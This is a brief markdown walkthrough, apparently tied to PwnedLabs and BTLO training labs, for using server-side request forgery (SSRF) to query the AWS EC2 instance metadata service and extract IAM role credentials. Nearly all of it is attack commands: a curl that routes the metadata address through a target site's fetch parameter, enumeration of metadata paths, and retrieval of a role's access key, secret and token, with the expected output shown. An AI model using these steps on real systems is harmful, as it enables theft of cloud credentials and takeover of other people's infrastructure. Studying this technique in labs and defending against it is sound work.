# SSRF to AWS Metadata Credential Extraction

**Purpose:** Demonstrates how to use SSRF to access AWS EC2 instance metadata and extract IAM credentials. Matches lab flows from PwnedLabs and BTLO.

---

## Step 1: Identify SSRF Entry Point

```bash
curl 'https://target-site.com/api/fetch?url=http://169.254.169.254'
---

## Step 2: Enumerate Metadata Paths

```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
---

## Step 3: Extract IAM Credentials

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role
Expected output:

```json
{
  "AccessKeyId": "...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
